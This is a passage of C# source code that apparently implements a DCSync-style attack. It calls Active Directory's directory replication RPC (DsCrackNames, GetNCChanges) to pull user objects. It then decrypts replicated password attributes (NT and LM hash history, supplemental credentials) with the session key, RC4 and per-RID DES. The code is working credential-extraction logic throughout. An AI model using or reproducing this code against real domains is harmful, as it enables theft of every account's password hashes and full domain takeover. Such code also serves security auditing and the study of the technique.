                    GCHandle handle2 = GCHandle.Alloc(tempValue2, GCHandleType.Pinned);
                    IntPtr tempValuePointer2 = handle2.AddrOfPinnedObject();
                    GCHandle handle3 = GCHandle.Alloc(dcInfoRep, GCHandleType.Pinned);
                    IntPtr tempValuePointer3 = handle3.AddrOfPinnedObject();
                    try
                    {
                        result = Interop.NdrClientCall2x64(GetStubHandle(), GetProcStringHandle(442), __arglist(hDrs, new IntPtr(dcInVersion), tempValuePointer1, tempValuePointer2, tempValuePointer3));
                        // each pinvoke work on a copy of the arguments (without an out specifier)
                        // get back the data
                        dcOutVersion = (UInt32)Marshal.ReadInt32(tempValuePointer2);
                        dcInfoRep = Marshal.ReadIntPtr(tempValuePointer3);
                    }
                    finally
                    {
                        handle1.Free();
                        handle2.Free();
                        handle3.Free();
                    }
                }
                else
                {
                    GCHandle handle1 = GCHandle.Alloc(dcInfoReq, GCHandleType.Pinned);
                    IntPtr tempValuePointer1 = handle1.AddrOfPinnedObject();
                    IntPtr tempValue2 = IntPtr.Zero;
                    GCHandle handle2 = GCHandle.Alloc(tempValue2, GCHandleType.Pinned);
                    IntPtr tempValuePointer2 = handle2.AddrOfPinnedObject();
                    GCHandle handle3 = GCHandle.Alloc(dcInfoRep, GCHandleType.Pinned);
                    IntPtr tempValuePointer3 = handle3.AddrOfPinnedObject();
                    try
                    {
                        result = CallNdrClientCall2x86(418, hDrs, new IntPtr(dcInVersion), tempValuePointer1, tempValuePointer2, tempValuePointer3);
                        // each pinvoke work on a copy of the arguments (without an out specifier)
                        // get back the data
                        dcOutVersion = (UInt32)Marshal.ReadInt32(tempValuePointer2);
                        dcInfoRep = Marshal.ReadIntPtr(tempValuePointer3);
                    }
                    finally
                    {
                        handle1.Free();
                        handle2.Free();
                        handle3.Free();
                    }
                }
                if (result == IntPtr.Zero)
                {
                    userGuid = ReadGuidFromCrackName(dcInfoRep);
                    if (userGuid == Guid.Empty)
                    {
                        result = new IntPtr(2); // not found
                    }
                }
            }
            catch (SEHException)
            {
                int ex = Marshal.GetExceptionCode();
                return (UInt32)ex;
            }
            finally
            {
                handle.Free();
                FreeTrackedMemoryAndRemoveTracking();
            }
            return (UInt32)result.ToInt64();
        }
        private Guid ReadGuidFromCrackName(IntPtr dcInfoRep)
        {
            Interop.DS_NAME_RESULTW result = (Interop.DS_NAME_RESULTW)Marshal.PtrToStructure(dcInfoRep, typeof(Interop.DS_NAME_RESULTW));
            if (result.cItems >= 1)
            {
                Interop.DS_NAME_RESULT_ITEMW item = (Interop.DS_NAME_RESULT_ITEMW)Marshal.PtrToStructure(result.rItems, typeof(Interop.DS_NAME_RESULT_ITEMW));
                if (item.status != 0)
                {
                    Trace.WriteLine("Error " + item.status + " when cracking the name");
                    return Guid.Empty;
                }
                else
                {
                    string guidString = Marshal.PtrToStringUni(item.pName);
                    return new Guid(guidString);
                }
            }
            else
            {
                return Guid.Empty;
            }

        }
        private UInt32 GetNCChanges(IntPtr hDrs, Guid ntDSAGuid, Guid Userguid, out List<Dictionary<int, object>> ReplicationData, bool allData = false)
        {
            IntPtr result = IntPtr.Zero;
            Int64 noGC = 1024 * 1024 * 10;
            bool status = GC.TryStartNoGCRegion(noGC);
            if (!status)
            {
                Helpers.WriteConsole("[!] Unable to disable the GC!");
            }
            ReplicationData = null;
            UInt32 dwInVersion = 8;
            UInt32 dwOutVersion = 0;
            Interop.DRS_MSG_GETCHGREQ_V8 pmsgIn = new Interop.DRS_MSG_GETCHGREQ_V8();
            Interop.DRS_MSG_GETCHGREPLY_V6 pmsgOut = new Interop.DRS_MSG_GETCHGREPLY_V6();
            Interop.DSNAME dsName = new Interop.DSNAME();
            dsName.Guid = Userguid;
            EnableMemoryTracking();
            try
            {
                Trace.WriteLine("GetNCChanges");

                IntPtr unmanageddsName = AllocateMemory(Marshal.SizeOf(typeof(Interop.DSNAME)));
                Marshal.StructureToPtr(dsName, unmanageddsName, true);
                pmsgIn.pNC = unmanageddsName;
                pmsgIn.ulFlags = 0x00000020 | 0x00000010 | 0x00200000 | 0x00008000 | 0x00080000;
                pmsgIn.cMaxObjects = (uint)(allData ? 1000 : 1);
                pmsgIn.cMaxBytes = 0x00a00000; // 10M
                pmsgIn.ulExtendedOp = (uint)(allData ? 0 : 6);
                pmsgIn.uuidDsaObjDest = ntDSAGuid;

                if (IntPtr.Size == 8)
                {
                    //result = Interop.NdrClientCall2x64(GetStubHandle(), GetProcStringHandle(134), __arglist(hDrs, dwInVersion, pmsgIn, dwOutVersion, ref pmsgOut));
                    GCHandle handle1 = GCHandle.Alloc(pmsgIn, GCHandleType.Pinned);
                    IntPtr tempValuePointer1 = handle1.AddrOfPinnedObject();
                    GCHandle handle2 = GCHandle.Alloc(dwOutVersion, GCHandleType.Pinned);
                    IntPtr tempValuePointer2 = handle2.AddrOfPinnedObject();
                    GCHandle handle3 = GCHandle.Alloc(pmsgOut, GCHandleType.Pinned);
                    IntPtr tempValuePointer3 = handle3.AddrOfPinnedObject();
                    try
                    {
                        result = Interop.NdrClientCall2x64(GetStubHandle(), GetProcStringHandle(134), __arglist(hDrs, new IntPtr(dwInVersion), tempValuePointer1, tempValuePointer2, tempValuePointer3));
                        // each pinvoke work on a copy of the arguments (without an out specifier)
                        // get back the data
                        dwOutVersion = (UInt32)Marshal.ReadInt32(tempValuePointer2);
                        pmsgOut = (Interop.DRS_MSG_GETCHGREPLY_V6)Marshal.PtrToStructure(tempValuePointer3, typeof(Interop.DRS_MSG_GETCHGREPLY_V6));
                    }
                    finally
                    {
                        GC.EndNoGCRegion();
                        handle1.Free();
                        handle2.Free();
                        handle3.Free();
                    }
                }
                else
                {
                    GCHandle handle1 = GCHandle.Alloc(pmsgIn, GCHandleType.Pinned);
                    IntPtr tempValuePointer1 = handle1.AddrOfPinnedObject();
                    GCHandle handle2 = GCHandle.Alloc(dwOutVersion, GCHandleType.Pinned);
                    IntPtr tempValuePointer2 = handle2.AddrOfPinnedObject();
                    GCHandle handle3 = GCHandle.Alloc(pmsgOut, GCHandleType.Pinned);
                    IntPtr tempValuePointer3 = handle3.AddrOfPinnedObject();
                    try
                    {
                        result = CallNdrClientCall2x86(128, hDrs, new IntPtr(dwInVersion), tempValuePointer1, tempValuePointer2, tempValuePointer3);
                        // each pinvoke work on a copy of the arguments (without an out specifier)
                        // get back the data
                        dwOutVersion = (UInt32)Marshal.ReadInt32(tempValuePointer2);
                        pmsgOut = (Interop.DRS_MSG_GETCHGREPLY_V6)Marshal.PtrToStructure(tempValuePointer3, typeof(Interop.DRS_MSG_GETCHGREPLY_V6));
                    }
                    finally
                    {
                        GC.EndNoGCRegion();
                        handle1.Free();
                        handle2.Free();
                        handle3.Free();
                    }
                }
                MarshalReplicationData(pmsgOut, out ReplicationData);
            }
            catch (SEHException)
            {
                int ex = Marshal.GetExceptionCode();
                return (UInt32)ex;
            }
            finally
            {
                FreeTrackedMemoryAndRemoveTracking();
            }
            return (UInt32)result.ToInt64();
        }
        private void MarshalReplicationData(Interop.DRS_MSG_GETCHGREPLY_V6 pmsgOut, out List<Dictionary<int, object>> replicationData)
        {
            replicationData = new List<Dictionary<int, object>>();
            uint numObjects = pmsgOut.cNumObjects;
            IntPtr pObject = pmsgOut.pObjects;
            for (uint c = 0; c < numObjects; c++)
            {
                Interop.REPLENTINFLIST list = (Interop.REPLENTINFLIST)Marshal.PtrToStructure(pObject, typeof(Interop.REPLENTINFLIST));
                int size = Marshal.SizeOf(typeof(Interop.ATTR));
                Dictionary<int, object> tmpData = new Dictionary<int, object>();
                for (uint i = 0; i < list.Entinf.AttrBlock.attrCount; i++)
                {
                    Interop.ATTR attr = (Interop.ATTR)Marshal.PtrToStructure(new IntPtr(list.Entinf.AttrBlock.pAttr.ToInt64() + i * size), typeof(Interop.ATTR));
                    Trace.WriteLine("Type= " + attr.attrTyp);
                    int sizeval = Marshal.SizeOf(typeof(Interop.ATTRVAL));
                    List<byte[]> values = new List<byte[]>();
                    for (uint j = 0; j < attr.AttrVal.valCount; j++)
                    {
                        Interop.ATTRVAL attrval = (Interop.ATTRVAL)Marshal.PtrToStructure(new IntPtr(attr.AttrVal.pAVal.ToInt64() + j * sizeval), typeof(Interop.ATTRVAL));
                        byte[] data = new byte[attrval.valLen];
                        Marshal.Copy(attrval.pVal, data, 0, (int)attrval.valLen);
                        switch ((Interop.ATT)attr.attrTyp)
                        {
                            //case ATT.ATT_CURRENT_VALUE:
                            case Interop.ATT.ATT_UNICODE_PWD:
                            case Interop.ATT.ATT_NT_PWD_HISTORY:
                            case Interop.ATT.ATT_DBCS_PWD:
                            case Interop.ATT.ATT_LM_PWD_HISTORY:
                            case Interop.ATT.ATT_SUPPLEMENTAL_CREDENTIALS:
                                //case ATT.ATT_TRUST_AUTH_INCOMING:
                                //case ATT.ATT_TRUST_AUTH_OUTGOING:
                                data = DecryptReplicationData(data);
                                break;
                        }
                        values.Add(data);
                    }
                    if (values.Count == 1)
                    {
                        tmpData[(int)attr.attrTyp] = values[0];
                    }
                    else if (values.Count > 1)
                    {
                        tmpData[(int)attr.attrTyp] = values;
                    }
                }
                replicationData.Add(tmpData);
                pObject = list.pNextEntInf;

            }
        }
        UInt32[] dwCrc32Table = new UInt32[]
        {
            0x00000000, 0x77073096, 0xEE0E612C, 0x990951BA,
            0x076DC419, 0x706AF48F, 0xE963A535, 0x9E6495A3,
            0x0EDB8832, 0x79DCB8A4, 0xE0D5E91E, 0x97D2D988,
            0x09B64C2B, 0x7EB17CBD, 0xE7B82D07, 0x90BF1D91,
            0x1DB71064, 0x6AB020F2, 0xF3B97148, 0x84BE41DE,
            0x1ADAD47D, 0x6DDDE4EB, 0xF4D4B551, 0x83D385C7,
            0x136C9856, 0x646BA8C0, 0xFD62F97A, 0x8A65C9EC,
            0x14015C4F, 0x63066CD9, 0xFA0F3D63, 0x8D080DF5,
            0x3B6E20C8, 0x4C69105E, 0xD56041E4, 0xA2677172,
            0x3C03E4D1, 0x4B04D447, 0xD20D85FD, 0xA50AB56B,
            0x35B5A8FA, 0x42B2986C, 0xDBBBC9D6, 0xACBCF940,
            0x32D86CE3, 0x45DF5C75, 0xDCD60DCF, 0xABD13D59,
            0x26D930AC, 0x51DE003A, 0xC8D75180, 0xBFD06116,
            0x21B4F4B5, 0x56B3C423, 0xCFBA9599, 0xB8BDA50F,
            0x2802B89E, 0x5F058808, 0xC60CD9B2, 0xB10BE924,
            0x2F6F7C87, 0x58684C11, 0xC1611DAB, 0xB6662D3D,

            0x76DC4190, 0x01DB7106, 0x98D220BC, 0xEFD5102A,
            0x71B18589, 0x06B6B51F, 0x9FBFE4A5, 0xE8B8D433,
            0x7807C9A2, 0x0F00F934, 0x9609A88E, 0xE10E9818,
            0x7F6A0DBB, 0x086D3D2D, 0x91646C97, 0xE6635C01,
            0x6B6B51F4, 0x1C6C6162, 0x856530D8, 0xF262004E,
            0x6C0695ED, 0x1B01A57B, 0x8208F4C1, 0xF50FC457,
            0x65B0D9C6, 0x12B7E950, 0x8BBEB8EA, 0xFCB9887C,
            0x62DD1DDF, 0x15DA2D49, 0x8CD37CF3, 0xFBD44C65,
            0x4DB26158, 0x3AB551CE, 0xA3BC0074, 0xD4BB30E2,
            0x4ADFA541, 0x3DD895D7, 0xA4D1C46D, 0xD3D6F4FB,
            0x4369E96A, 0x346ED9FC, 0xAD678846, 0xDA60B8D0,
            0x44042D73, 0x33031DE5, 0xAA0A4C5F, 0xDD0D7CC9,
            0x5005713C, 0x270241AA, 0xBE0B1010, 0xC90C2086,
            0x5768B525, 0x206F85B3, 0xB966D409, 0xCE61E49F,
            0x5EDEF90E, 0x29D9C998, 0xB0D09822, 0xC7D7A8B4,
            0x59B33D17, 0x2EB40D81, 0xB7BD5C3B, 0xC0BA6CAD,

            0xEDB88320, 0x9ABFB3B6, 0x03B6E20C, 0x74B1D29A,
            0xEAD54739, 0x9DD277AF, 0x04DB2615, 0x73DC1683,
            0xE3630B12, 0x94643B84, 0x0D6D6A3E, 0x7A6A5AA8,
            0xE40ECF0B, 0x9309FF9D, 0x0A00AE27, 0x7D079EB1,
            0xF00F9344, 0x8708A3D2, 0x1E01F268, 0x6906C2FE,
            0xF762575D, 0x806567CB, 0x196C3671, 0x6E6B06E7,
            0xFED41B76, 0x89D32BE0, 0x10DA7A5A, 0x67DD4ACC,
            0xF9B9DF6F, 0x8EBEEFF9, 0x17B7BE43, 0x60B08ED5,
            0xD6D6A3E8, 0xA1D1937E, 0x38D8C2C4, 0x4FDFF252,
            0xD1BB67F1, 0xA6BC5767, 0x3FB506DD, 0x48B2364B,
            0xD80D2BDA, 0xAF0A1B4C, 0x36034AF6, 0x41047A60,
            0xDF60EFC3, 0xA867DF55, 0x316E8EEF, 0x4669BE79,
            0xCB61B38C, 0xBC66831A, 0x256FD2A0, 0x5268E236,
            0xCC0C7795, 0xBB0B4703, 0x220216B9, 0x5505262F,
            0xC5BA3BBE, 0xB2BD0B28, 0x2BB45A92, 0x5CB36A04,
            0xC2D7FFA7, 0xB5D0CF31, 0x2CD99E8B, 0x5BDEAE1D,

            0x9B64C2B0, 0xEC63F226, 0x756AA39C, 0x026D930A,
            0x9C0906A9, 0xEB0E363F, 0x72076785, 0x05005713,
            0x95BF4A82, 0xE2B87A14, 0x7BB12BAE, 0x0CB61B38,
            0x92D28E9B, 0xE5D5BE0D, 0x7CDCEFB7, 0x0BDBDF21,
            0x86D3D2D4, 0xF1D4E242, 0x68DDB3F8, 0x1FDA836E,
            0x81BE16CD, 0xF6B9265B, 0x6FB077E1, 0x18B74777,
            0x88085AE6, 0xFF0F6A70, 0x66063BCA, 0x11010B5C,
            0x8F659EFF, 0xF862AE69, 0x616BFFD3, 0x166CCF45,
            0xA00AE278, 0xD70DD2EE, 0x4E048354, 0x3903B3C2,
            0xA7672661, 0xD06016F7, 0x4969474D, 0x3E6E77DB,
            0xAED16A4A, 0xD9D65ADC, 0x40DF0B66, 0x37D83BF0,
            0xA9BCAE53, 0xDEBB9EC5, 0x47B2CF7F, 0x30B5FFE9,
            0xBDBDF21C, 0xCABAC28A, 0x53B39330, 0x24B4A3A6,
            0xBAD03605, 0xCDD70693, 0x54DE5729, 0x23D967BF,
            0xB3667A2E, 0xC4614AB8, 0x5D681B02, 0x2A6F2B94,
            0xB40BBE37, 0xC30C8EA1, 0x5A05DF1B, 0x2D02EF8D,
        };
        UInt32 CalcCrc32(byte[] data)
        {
            UInt32 dwCRC = 0xFFFFFFFF;
            for (int i = 0; i < data.Length; i++)
            {
                dwCRC = (dwCRC >> 8) ^ dwCrc32Table[(data[i]) ^ (dwCRC & 0x000000FF)];
            }
            dwCRC = ~dwCRC;
            return dwCRC;
        }
        private byte[] DecryptReplicationData(byte[] data)
        {
            if (data.Length < 16)
                return null;
            MD5CryptoServiceProvider md5 = new MD5CryptoServiceProvider();
            md5.TransformBlock(SessionKey, 0, SessionKey.Length, SessionKey, 0);
            md5.TransformFinalBlock(data, 0, 16);
            byte[] key = md5.Hash;
            byte[] todecrypt = new byte[data.Length - 16];
            Array.Copy(data, 16, todecrypt, 0, data.Length - 16);
            byte[] decrypted = Interop.RtlEncryptDecryptRC4(todecrypt, key);
            byte[] output = new byte[decrypted.Length - 4];
            Array.Copy(decrypted, 4, output, 0, decrypted.Length - 4);
            UInt32 crc = CalcCrc32(output);
            UInt32 expectedCrc = BitConverter.ToUInt32(decrypted, 0);
            if (crc != expectedCrc)
                return null;
            return output;
        }
        private void DecodeReplicationFields(List<Dictionary<int, object>> ReplicationData, out List<Dictionary<string, object>> DecodedReplicationData)
        {
            DecodedReplicationData = new List<Dictionary<string, object>>();
            foreach (var replicationObject in ReplicationData)
            {
                Dictionary<string, object> tmpDecodedReplicationObject = new Dictionary<string, object>();
                foreach (Interop.ATT att in Enum.GetValues(typeof(Interop.ATT)))
                {
                    if (replicationObject.ContainsKey((int)att))
                    {
                        byte[] data = replicationObject[(int)att] as byte[];
                        DecodeData(data, att, replicationObject, tmpDecodedReplicationObject);
                    }
                }
                DecodedReplicationData.Add(tmpDecodedReplicationObject);
            }
        }
        private void DecodeData(byte[] data, Interop.ATT att, Dictionary<int, object> ReplicationData, Dictionary<string, object> DecodedReplicationData)
        {
            switch (att)
            {
                case Interop.ATT.ATT_WHEN_CREATED:
                case Interop.ATT.ATT_WHEN_CHANGED:
                    //    var test = BitConverter.ToInt64(data, 0);    
                    //string stringdate = UnicodeEncoding.Default.GetString(data);
                    //    DateTime d = DateTime.ParseExact(stringdate, "yyyyMMddHHmmss.f'Z'", CultureInfo.InvariantCulture);
                    //    DecodedReplicationData.Add(att.ToString(), d);
                    break;
                case Interop.ATT.ATT_LAST_LOGON:
                case Interop.ATT.ATT_PWD_LAST_SET:
                case Interop.ATT.ATT_ACCOUNT_EXPIRES:
                case Interop.ATT.ATT_LOCKOUT_TIME:
                    Int64 intdate = BitConverter.ToInt64(data, 0);
                    DateTime datetime;
                    if (intdate == Int64.MaxValue)
                    {
                        datetime = DateTime.MaxValue;
                    }
                    else
                    {
                        datetime = DateTime.FromFileTime(intdate);
                    }
                    DecodedReplicationData.Add(att.ToString(), datetime);
                    break;
                case Interop.ATT.ATT_RDN:
                case Interop.ATT.ATT_SAM_ACCOUNT_NAME:
                case Interop.ATT.ATT_USER_PRINCIPAL_NAME:
                    DecodedReplicationData.Add(att.ToString(), UnicodeEncoding.Unicode.GetString(data));
                    break;
                case Interop.ATT.ATT_SERVICE_PRINCIPAL_NAME:
                    List<string> spns = new List<string>();
                    if (data == null)
                    {
                        List<byte[]> spnlist = ReplicationData[(int)att] as List<byte[]>;
                        foreach (byte[] spnitem in spnlist)
                            spns.Add(UnicodeEncoding.Unicode.GetString(spnitem));
                    }
                    else
                        spns.Add(UnicodeEncoding.Unicode.GetString(data));
                    DecodedReplicationData.Add(att.ToString(), spns);
                    break;
                case Interop.ATT.ATT_LOGON_WORKSTATION:
                    break;
                case Interop.ATT.ATT_USER_ACCOUNT_CONTROL:
                    DecodedReplicationData.Add(att.ToString(), BitConverter.ToInt32(data, 0));
                    break;
                case Interop.ATT.ATT_SAM_ACCOUNT_TYPE:
                    DecodedReplicationData.Add(att.ToString(), BitConverter.ToInt32(data, 0));
                    break;
                case Interop.ATT.ATT_SUPPLEMENTAL_CREDENTIALS:
                    DecodedReplicationData.Add(att.ToString(), new Interop.USER_PROPERTIES(data, ReplicationData[(int)Interop.ATT.ATT_OBJECT_SID] as byte[]));
                    break;
                case Interop.ATT.ATT_UNICODE_PWD:
                case Interop.ATT.ATT_DBCS_PWD:
                case Interop.ATT.ATT_NT_PWD_HISTORY:
                case Interop.ATT.ATT_LM_PWD_HISTORY:
                    byte[] decrypted = DecryptHashUsingSID(data, ReplicationData[(int)Interop.ATT.ATT_OBJECT_SID] as byte[]);
                    DecodedReplicationData.Add(att.ToString(), decrypted);
                    break;
                case Interop.ATT.ATT_SID_HISTORY:
                case Interop.ATT.ATT_OBJECT_SID:
                    DecodedReplicationData.Add(att.ToString(), new SecurityIdentifier(data, 0));
                    break;
                case Interop.ATT.ATT_LOGON_HOURS:
                default:
                    DecodedReplicationData.Add(att.ToString(), data.ToString());
                    break;
            }
        }
        private byte[] DecryptHashUsingSID(byte[] hashEncryptedWithRID, byte[] sidByteForm)
        {
            // extract the RID from the SID
            GCHandle handle = GCHandle.Alloc(sidByteForm, GCHandleType.Pinned);
            IntPtr sidIntPtr = handle.AddrOfPinnedObject();
            IntPtr SubAuthorityCountIntPtr = Interop.GetSidSubAuthorityCount(sidIntPtr);
            byte SubAuthorityCount = Marshal.ReadByte(SubAuthorityCountIntPtr);
            IntPtr SubAuthorityIntPtr = Interop.GetSidSubAuthority(sidIntPtr, (uint)SubAuthorityCount - 1);
            UInt32 rid = (UInt32)Marshal.ReadInt32(SubAuthorityIntPtr);
            handle.Free();
            // Decrypt the hash
            byte[] output = new byte[16];
            IntPtr outputPtr = Marshal.AllocHGlobal(16);
            Interop.RtlDecryptDES2blocks1DWORD(hashEncryptedWithRID, ref rid, outputPtr);
            Marshal.Copy(outputPtr, output, 0, 16);
            Marshal.FreeHGlobal(outputPtr);
            return output;
        }
        #endregion
    }
}
